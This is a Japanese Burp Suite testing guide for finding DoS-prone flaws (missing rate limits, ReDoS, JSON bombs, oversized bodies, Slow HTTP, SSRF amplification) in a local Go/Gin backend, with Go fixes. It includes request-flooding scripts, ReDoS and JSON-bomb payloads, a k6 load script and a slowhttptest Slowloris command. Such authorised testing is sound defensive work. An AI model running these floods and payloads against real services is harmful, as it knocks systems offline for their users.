# Burp Suite — DoS / DDoS 関連脆弱性 検出手順

## 対象脆弱性

DoS (Denial of Service) / DDoS (Distributed DoS) に直結するアプリケーション層の脆弱性。

| 脆弱性 | OWASP 分類 | Burp 機能 |
|--------|-----------|-----------|
| レートリミット欠如 | A04 Insecure Design | Intruder / Turbo Intruder |
| ReDoS | A04 Insecure Design | Intruder + 応答時間分析 |
| Slow HTTP | A05 Security Misconfiguration | Repeater + タイムアウト観察 |
| 巨大ペイロード | A04 Insecure Design | Repeater / Intruder |
| JSON/XML Bomb | A04 Insecure Design | Repeater |
| セッションリソース枯渇 | A07 Identification Failures | Intruder でセッション大量生成 |

> **重要**: 自分が所有または許可を得た環境でのみ実施すること。  
> 本番環境での DoS テストは絶対に禁止。

---

## 検証対象の想定環境

```
Go バックエンド (Gin フレームワーク)
エンドポイント:
  POST /api/login          (レートリミットなし)
  GET  /api/search?q=xxx   (ReDoS 脆弱な正規表現)
  POST /api/upload         (ファイルサイズ制限なし)
  POST /api/data           (JSON 深さ制限なし)
  POST /api/register       (アカウント大量生成可能)
```

---

## 事前準備

### 1. Burp Suite の起動とプロキシ設定

```
burpsuite → Proxy → Intercept → "Intercept is on"

ブラウザプロキシ: 127.0.0.1:8080
CA 証明書: http://burpsuite → ダウンロード → ブラウザにインポート
```

---

## 検証 1: レートリミット欠如の検出 (Intruder)

### ステップ 1: リクエストをキャプチャ

```
1. ブラウザで POST /api/login を実行:
   {"username":"test","password":"wrong"}

2. Proxy → HTTP history → /api/login を右クリック
   → "Send to Intruder"
```

### ステップ 2: Intruder の設定

```
Intruder → Positions タブ

Attack type: Sniper

Body 内の password の値をハイライトして § マークを付ける:
  {"username":"test","password":"§wrong§"}
```

### ステップ 3: ペイロードの設定

```
Intruder → Payloads タブ

Payload type: Simple list
ペイロードを追加:
  wrong1
  wrong2
  wrong3
  ...
  wrong200

または:
Payload type: Numbers
From: 1 / To: 200 / Step: 1
Format: wrong%s
```

### ステップ 4: 攻撃の実行と結果確認

```
"Start attack" をクリック

結果テーブルで確認:
  Request# | Status | Length  | Time
  1        | 401    | 52      | 12ms
  2        | 401    | 52      | 11ms
  ...
  200      | 401    | 52      | 13ms
  ← 429 が一度も出なければ Rate Limit なし = 脆弱

カラムヘッダ "Status" をクリックしてソート → 429 の行が存在するか確認
```

---

## 検証 2: レートリミット欠如 (Turbo Intruder で高速確認)

Community 版に Turbo Intruder をインストール:

```
BApp Store → "Turbo Intruder" → Install
```

### Turbo Intruder スクリプト

```python
# POST /api/login への高速連続送信
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=10,
        requestsPerConnection=10,
        pipeline=False
    )

    for i in range(500):
        engine.queue(target.req, str(i))

def handleResponse(req, interesting):
    if '429' in req.response:
        table.add(req)
```

```
HTTP history → /api/login を右クリック
→ "Extensions" → "Send to Turbo Intruder"
→ 上記スクリプトを貼り付け → "Attack"

500 リクエスト中に 429 が出なければ Rate Limit なし
```

---

## 検証 3: ReDoS の検出 (Intruder + 応答時間分析)

### ステップ 1: リクエストをキャプチャ

```
ブラウザで GET /api/search?q=hello を実行
HTTP history → 右クリック → "Send to Intruder"
```

### ステップ 2: Intruder でペイロード設定

```
Positions タブ:
  GET /api/search?q=§hello§ HTTP/1.1

Payloads タブ:
Payload type: Simple list

以下の ReDoS ペイロードを追加:
  hello
  aaaaaaaaaaaaaaaaaaaab
  aaaaaaaaaaaaaaaaaaaaaab
  aaaaaaaaaaaaaaaaaaaaaaab
  aaaaaaaaaaaaaaaaaaaaaaaab
  aaaaaaaaaaaaaaaaaaaaaaaaab
  aaaaaaaaaaaaaaaaaaaaaaaaaab
  aaaaaaaaaaaaaaaaaaaaaaaaaaab
  aaaaaaaaaaaaaaaaaaaaaaaaaaaab
  aaaaaaaaaaaaaaaaaaaaaaaaaaaaab
  (a+)+b
  (a|aa)+b
```

### ステップ 3: 応答時間の確認

```
"Start attack" → 結果テーブルで "Time" 列を確認

Columns ボタン → "Response received" を追加してソート

  Payload                           | Status | Time
  hello                             | 200    | 12ms
  aaaaaaaaaaaaaaaaaaaaaaaaaab       | 200    | 15ms
  aaaaaaaaaaaaaaaaaaaaaaaaaaab      | 200    | 423ms
  aaaaaaaaaaaaaaaaaaaaaaaaaaaab     | 200    | 4821ms   ← ReDoS 疑い
  aaaaaaaaaaaaaaaaaaaaaaaaaaaaab    | 504    | 30000ms  ← ReDoS 確定
```

応答時間が指数的に増加すればReDoSが存在する。

---

## 検証 4: 巨大ペイロードのテスト (Repeater)

### ステップ 1: リクエストをキャプチャ

```
POST /api/data を Proxy でキャプチャ
→ "Send to Repeater"
```

### ステップ 2: 段階的にサイズを増やしてテスト

```
Repeater タブで Body を以下に変更:

# 1 KB
{"data":"AAAA..."}  (1024 文字)

# 1 MB
{"data":"AAAA..."}  (1,048,576 文字)

# 10 MB
{"data":"AAAA..."}  (10,485,760 文字)
```

Burp の Payload generation (Python):

```python
# Burp Extension またはコンソールで生成
size = 1_000_000
payload = '{"data":"' + 'A' * size + '"}'
# Repeaterのボディに貼り付け
```

### 期待する結果

```
Size: 1 KB    → HTTP 200 (正常)
Size: 1 MB    → HTTP 413 Request Entity Too Large (制限あり = 安全)
Size: 10 MB   → HTTP 413 (制限あり = 安全)

HTTP 200 が返り続ける場合 → ペイロードサイズ制限なし = DoS リスク
```

---

## 検証 5: JSON Bomb のテスト (Repeater)

### ステップ 1: JSON Bomb ペイロードの作成

```python
# Burp の Inspector またはローカルで生成
depth = 25
bomb = '"end"'
for _ in range(depth):
    bomb = '{"a":' + bomb + '}'
print(f"JSON Bomb size: {len(bomb)} bytes")
# → 約 175 bytes だが解析コストは指数的
```

### ステップ 2: Repeater で送信

```
POST /api/data HTTP/1.1
Host: localhost:8080
Content-Type: application/json

{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":"end"}}}}}}}}}}}}}}}}}}}}}}}}}
```

"Send" → 応答時間と HTTP ステータスを確認。

```
即座に 400 Bad Request → 深さ制限あり (安全)
応答に 2 秒以上かかる → JSON パーサが枯渇している (脆弱)
```

---

## 検証 6: セッション/トークン大量生成 (Intruder)

セッションやアカウントを大量生成してサーバリソースを枯渇させる攻撃を確認。

```
POST /api/register の Intruder 設定:

Positions:
  {"username":"§user1§","email":"§user1§@test.com","password":"pass"}

Payloads:
Payload type: Numbers
From: 1 / To: 1000 / Step: 1

Attack 後:
  - 全リクエストが 201 Created → アカウント登録に制限なし (脆弱)
  - 429 が返り始める → レートリミットあり (安全)
  - captcha / メール認証が要求される → 適切な保護 (安全)
```

---

## 検証 7: Slow HTTP の確認 (Repeater)

Burp Suite は Slowloris の直接実行ツールではないが、サーバの ReadTimeout を Repeater で確認できる。

### Connection タイムアウトの観察

```
Repeater でリクエストを送信する際:
  1. "Request headers" タブでヘッダを 1 行だけ送信
     (Content-Length を含むが Body を送らない = 不完全リクエスト)

  GET /api/users HTTP/1.1
  Host: localhost:8080
  Content-Length: 100
  [Body は入力しない]

  2. "Send" → タイムアウトまでの時間を計測

  5秒以内に応答が切断される → ReadTimeout 設定あり (安全)
  30秒以上待機する → ReadTimeout 未設定 (Slowloris 脆弱)
```

---

## 検証 8: Collaborator で OOB DoS 確認 (Professional 版)

SSRF と組み合わせた増幅攻撃 (amplification) のリスクを確認する。

```
Burp Collaborator client → "Copy to clipboard"
→ ペイロード: abcde1234.burpcollaborator.net

# SSRF 経由でサーバから外部 HTTP リクエストを誘発
POST /api/fetch HTTP/1.1
Content-Type: application/json

{"url":"http://abcde1234.burpcollaborator.net/large-resource?repeat=1000"}

→ Collaborator に複数の HTTP リクエストが届けば SSRF + Amplification リスクあり
```

---

## 補完ツールとの連携

Burp だけでは DDoS の完全な検証はできない。以下のツールと組み合わせる:

```bash
# k6 でレートリミットの閾値を定量的に測定
k6 run - <<'EOF'
import http from 'k6/http';
import { sleep } from 'k6';

export let options = {
  vus: 100,
  duration: '30s',
};

export default function() {
  let res = http.post('http://localhost:8080/api/login',
    JSON.stringify({username: 'test', password: 'wrong'}),
    { headers: { 'Content-Type': 'application/json' } }
  );
  console.log(res.status);
}
EOF

# slowhttptest で Slowloris テスト
slowhttptest -c 200 -H -i 10 -r 200 -t GET \
  -u http://localhost:8080/api/users -x 24 -p 3
```

---

## 修正方法 (Go コード)

### レートリミット実装

```go
import (
    "github.com/ulule/limiter/v3"
    "github.com/ulule/limiter/v3/drivers/middleware/gin"
    "github.com/ulule/limiter/v3/drivers/store/memory"
)

rate, _ := limiter.NewRateFromFormatted("10-M")  // 1分に10回
store := memory.NewStore()
instance := limiter.New(store, rate)

router.POST("/api/login", gin_limiter.NewMiddleware(instance), loginHandler)
router.POST("/api/register", gin_limiter.NewMiddleware(instance), registerHandler)
```

### ボディサイズ制限

```go
router.Use(func(c *gin.Context) {
    c.Request.Body = http.MaxBytesReader(c.Writer, c.Request.Body, 1<<20) // 1 MB
    c.Next()
})
```

### ReadTimeout / WriteTimeout の設定

```go
srv := &http.Server{
    Addr:         ":8080",
    Handler:      router,
    ReadTimeout:  5 * time.Second,
    WriteTimeout: 10 * time.Second,
    IdleTimeout:  30 * time.Second,
    ReadHeaderTimeout: 2 * time.Second,
}
```

### ReDoS 対策

```go
// NG: バックトラッキングが爆発する正規表現
pattern := regexp.MustCompile(`^(a+)+$`)

// OK: シンプルな文字クラス + 長さ制限
const maxInputLen = 100
if len(input) > maxInputLen {
    c.JSON(400, gin.H{"error": "input too long"})
    return
}
pattern := regexp.MustCompile(`^[a-z0-9_-]+$`)
```

---

## Community 版 vs Professional 版 の DoS テスト比較

| テスト項目 | Community | Professional |
|-----------|-----------|-------------|
| Intruder (無制限速度) | × (速度制限あり) | ○ |
| Turbo Intruder (拡張) | ○ (BApp Store) | ○ |
| 自動スキャナ | × | ○ |
| Collaborator (OOB) | × | ○ |
| Repeater での手動テスト | ○ | ○ |
| 応答時間ベースの分析 | ○ (手動) | ○ (自動) |

---

## Burp Suite による DoS 関連検出の限界

| 限界 | 内容 |
|------|------|
| 実際の DDoS 再現 | 単一ホストからの攻撃しかできない。分散攻撃は k6 / Locust 等が必要 |
| ネットワーク層 DoS | L3/L4 攻撃 (SYN Flood 等) は対象外 |
| Intruder の速度制限 (Community) | Community 版は Intruder に速度制限があり、大量リクエストの検証精度が低い |
| 自動 ReDoS 検出 (Community) | Community 版に Scanner がないため ReDoS は手動 Intruder テストのみ |
| Slowloris 直接実行 | Burp は Slowloris ツールではない。slowhttptest 等の専用ツールが必要 |
